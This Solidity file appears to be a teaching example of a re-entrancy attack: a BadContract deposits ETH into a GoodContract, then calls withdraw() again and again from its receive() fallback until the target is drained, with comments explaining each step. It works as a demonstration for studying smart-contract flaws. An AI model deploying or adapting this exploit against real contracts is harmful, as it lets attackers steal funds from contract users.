//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./GoodContract.sol";

contract BadContract {
        GoodContract public goodContract;

        constructor(address _goodContractAddress) {
            goodContract = GoodContract(_goodContractAddress);
        }

        // Function to receive Ether
        receive() external payable {
            if(address(goodContract).balance > 0) {
                goodContract.withdraw();
            }
        }

        // Starts the attack
        function attack() public payable {
            goodContract.addBalance{value: msg.value}() ;
            goodContract.withdraw();
        }
}

/*
1. Within the constructor, this contract sets the address of GoodContract and initializes an instance of it

2. The attack function is a payable function that takes some ETH from the attacker, 
deposits it into GoodContract, and then calls the withdraw function in GoodContract.

3. At this point, GoodContract will see that BadContract has a balance greater than 0,
 so it will send some ETH back to BadContract. 
However, doing this will trigger the receive() function in BadContract

4. he receive() function will check if GoodContract still has a balance greater than 0 ETH, 
and call the withdraw function in GoodContract again.

5. This will create a loop where GoodContract will keep sending money to BadContract until it completely runs out of funds, 
and then finally reach a point where it updates BadContract's balance to 0 and completes the transaction execution. 
At this point, the attacker has successfully stolen all the ETH from GoodContract due to re-entrancy.

 */